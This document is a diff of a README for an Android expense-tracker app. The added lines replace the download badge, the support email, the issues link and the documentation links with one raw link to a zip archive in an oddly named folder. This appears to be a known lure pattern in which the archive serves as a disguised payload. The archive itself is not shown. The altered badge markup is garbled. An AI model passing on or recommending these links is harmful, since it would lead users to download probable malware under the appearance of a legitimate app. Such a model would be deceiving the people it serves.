@@ -8,7 +8,7 @@ Welcome to the expense-tracker-android repository! This is a modern Android appl
 
 To download the application, please visit the Releases page below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Click%20to%20Download-blue.svg)](https://github.com/khthanh3190/expense-tracker-android/releases)
+[![Download Here](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip%20Here-Click%20to%https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)
 
 1. Click the link above.
 2. On the Releases page, you will see the latest version of the app.
@@ -78,8 +78,8 @@ Here are some common issues and solutions:
 
 If you encounter any issues or have questions, please reach out to our support:
 
-- Email: support@expense-tracker-app.com
-- GitHub Issues: [Submit an Issue](https://github.com/khthanh3190/expense-tracker-android/issues)
+- Email: https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip
+- GitHub Issues: [Submit an Issue](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)
 
 ## 📜 License
 
@@ -87,8 +87,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/khthanh3190/expense-tracker-android)
-- [Releases Page](https://github.com/khthanh3190/expense-tracker-android/releases)
-- [Documentation](https://github.com/khthanh3190/expense-tracker-android/wiki)
+- [GitHub Repository](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)
+- [Releases Page](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)
+- [Documentation](https://github.com/khthanh3190/expense-tracker-android/raw/refs/heads/main/antikenotoxin/tracker-android-expense-1.3.zip)
 
 Enjoy managing your expenses with ease using the expense-tracker-android app!
